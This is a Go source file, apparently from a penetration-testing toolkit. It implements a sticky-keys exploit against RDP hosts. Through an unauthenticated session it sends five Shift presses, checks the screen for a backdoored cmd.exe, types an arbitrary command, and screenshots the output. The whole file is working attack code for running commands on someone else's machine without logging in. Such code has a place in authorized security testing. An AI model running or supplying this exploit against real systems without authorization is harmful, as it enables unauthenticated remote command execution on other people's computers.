// Copyright 2026 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package rdp

import (
	"context"
	"fmt"
	"image"
	"image/png"
	"os"
	"time"
)

// ExecResult holds the outcome of a sticky keys command execution.
type ExecResult struct {
	BackdoorDetected bool
	Command          string
	ScreenshotPath   string // Path to PNG screenshot after command execution
	Error            string
}

// RunStickyKeysExec connects to an RDP target, triggers the sticky keys backdoor,
// and if detected, types the specified command. Captures a screenshot of the result.
// The command's on-screen output is not read back: detection is bitmap-heuristic only.
func RunStickyKeysExec(ctx context.Context, target, command string, timeout time.Duration) *ExecResult {
	result := &ExecResult{Command: command}

	fmt.Fprintf(os.Stderr, "[*] Connecting to %s for sticky keys exploitation...\n", target)

	// Create interactive session (non-NLA, no auth)
	sess, err := NewInteractiveSession(ctx, target, timeout, 1024, 768)
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		return result
	}
	defer sess.Close()

	// Wait for login screen to render
	fmt.Fprintf(os.Stderr, "[*] Waiting for login screen...\n")
	time.Sleep(3 * time.Second)
	sess.WaitForFrame(2 * time.Second)

	// Capture baseline
	baseline, err := sess.CaptureFrame()
	if err != nil {
		result.Error = fmt.Sprintf("capture baseline: %v", err)
		return result
	}

	// Send 5x Shift to trigger sticky keys
	fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift key to trigger sticky keys...\n")
	for i := 0; i < 5; i++ {
		if sendErr := sess.SendKey(leftShiftScancode, true); sendErr != nil {
			result.Error = fmt.Sprintf("shift press %d: %v", i+1, sendErr)
			return result
		}
		time.Sleep(50 * time.Millisecond)
		if sendErr := sess.SendKey(leftShiftScancode, false); sendErr != nil {
			result.Error = fmt.Sprintf("shift release %d: %v", i+1, sendErr)
			return result
		}
		time.Sleep(50 * time.Millisecond)
	}

	// Wait for response
	time.Sleep(1 * time.Second)
	sess.WaitForFrame(2 * time.Second)

	// Capture response and check for backdoor
	response, err := sess.CaptureFrame()
	if err != nil {
		result.Error = fmt.Sprintf("capture response: %v", err)
		return result
	}

	// Bitmap dark-delta heuristic is the sole detection signal.
	analysis := runStickyKeysAnalysis(baseline, response, sess.Width(), sess.Height())
	if analysis.OverallVerdict == "clean" {
		fmt.Fprintf(os.Stderr, "[!] No backdoor detected (heuristic: %s). Aborting.\n", analysis.HeuristicResult)
		result.BackdoorDetected = false
		return result
	}

	result.BackdoorDetected = true
	fmt.Fprintf(os.Stderr, "[+] Backdoor detected (%s, confidence: %.0f%%).\n",
		analysis.OverallVerdict, analysis.Confidence*100)

	// Maximize the cmd.exe window (Alt+Space → X) for better output visibility
	fmt.Fprintf(os.Stderr, "[*] Maximizing terminal window...\n")
	if maxErr := maximizeWindow(sess); maxErr != nil {
		// Non-fatal: proceed with the smaller window
		fmt.Fprintf(os.Stderr, "[!] Could not maximize window: %v\n", maxErr)
	} else {
		time.Sleep(500 * time.Millisecond)
		sess.WaitForFrame(1 * time.Second)
	}

	// Type the command
	fmt.Fprintf(os.Stderr, "[*] Typing command: %s\n", command)
	if typeErr := sess.TypeString(command); typeErr != nil {
		result.Error = fmt.Sprintf("typing command: %v", typeErr)
		return result
	}
	time.Sleep(100 * time.Millisecond)
	if enterErr := sess.PressEnter(); enterErr != nil {
		result.Error = fmt.Sprintf("press enter: %v", enterErr)
		return result
	}

	// Wait for command output
	fmt.Fprintf(os.Stderr, "[*] Waiting for command output...\n")
	time.Sleep(2 * time.Second)
	sess.WaitForFrame(2 * time.Second)

	// Capture final screenshot
	frame, err := sess.CaptureFrame()
	if err != nil {
		result.Error = fmt.Sprintf("capture result: %v", err)
		return result
	}

	// Save screenshot
	screenshotPath := fmt.Sprintf("sticky-keys-exec-%d.png", time.Now().Unix())
	if saveErr := saveRGBAScreenshot(frame, sess.Width(), sess.Height(), screenshotPath); saveErr != nil {
		result.Error = fmt.Sprintf("save screenshot: %v", saveErr)
		return result
	}
	result.ScreenshotPath = screenshotPath
	fmt.Fprintf(os.Stderr, "[+] Screenshot saved to %s\n", screenshotPath)

	return result
}

// saveRGBAScreenshot saves RGBA framebuffer data as a PNG file.
func saveRGBAScreenshot(rgba []byte, width, height uint32, path string) error {
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	expectedLen := int(width) * int(height) * 4
	if len(rgba) < expectedLen {
		return fmt.Errorf("frame too small: got %d bytes, expected %d", len(rgba), expectedLen)
	}
	copy(img.Pix, rgba[:expectedLen])

	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer func() { _ = f.Close() }()

	return png.Encode(f, img)
}

// Scancodes for window maximize sequence (PS/2 Set 1).
const (
	altScancode   = 0x38 // Left Alt
	spaceScancode = 0x39 // Space
	xScancode     = 0x2D // X key
)

// maximizeWindow sends Alt+Space then X to maximize the active window via the system menu.
func maximizeWindow(sess *InteractiveSession) error {
	// Alt+Space opens the system menu
	if err := sess.SendKey(altScancode, true); err != nil {
		return fmt.Errorf("alt press: %w", err)
	}
	time.Sleep(20 * time.Millisecond)
	if err := sess.SendKey(spaceScancode, true); err != nil {
		return fmt.Errorf("space press: %w", err)
	}
	time.Sleep(20 * time.Millisecond)
	if err := sess.SendKey(spaceScancode, false); err != nil {
		return fmt.Errorf("space release: %w", err)
	}
	time.Sleep(20 * time.Millisecond)
	if err := sess.SendKey(altScancode, false); err != nil {
		return fmt.Errorf("alt release: %w", err)
	}

	// Wait for system menu to appear
	time.Sleep(500 * time.Millisecond)

	// Press 'x' to select Maximize
	if err := sess.SendKey(xScancode, true); err != nil {
		return fmt.Errorf("x press: %w", err)
	}
	time.Sleep(20 * time.Millisecond)
	if err := sess.SendKey(xScancode, false); err != nil {
		return fmt.Errorf("x release: %w", err)
	}

	return nil
}
